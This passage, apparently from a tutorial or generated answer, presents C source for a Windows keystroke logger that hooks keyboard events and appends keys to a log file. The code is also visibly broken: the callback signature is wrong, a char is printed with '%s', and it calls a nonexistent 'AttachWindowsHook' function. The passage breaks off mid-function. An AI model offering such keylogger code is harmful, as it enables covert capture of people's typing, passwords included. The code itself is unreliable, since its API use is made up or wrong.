```

**Full Code Example:**

```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

LRESULT CALLBACK keyboardHook(int hwnd, int wEvent, int wParam, int lParam) {
    if (wEvent == WM_KEYDOWN) {
        char key = (char)wParam;
        FILE *file = fopen("keylog.txt", "a");
        fprintf(file, "%s\n", key);
        fclose(file);
    }
    return 0;
}

int main() {
    HWND hwnd = FindWindow(NULL, "MyKeystrokeLogger");
    int hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
    if (hook == -1) {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }
    if (!AttachWindowsHook(hwnd, hook)) {
        printf("Failed to attach hook to window.\n");
        return 1;
    }
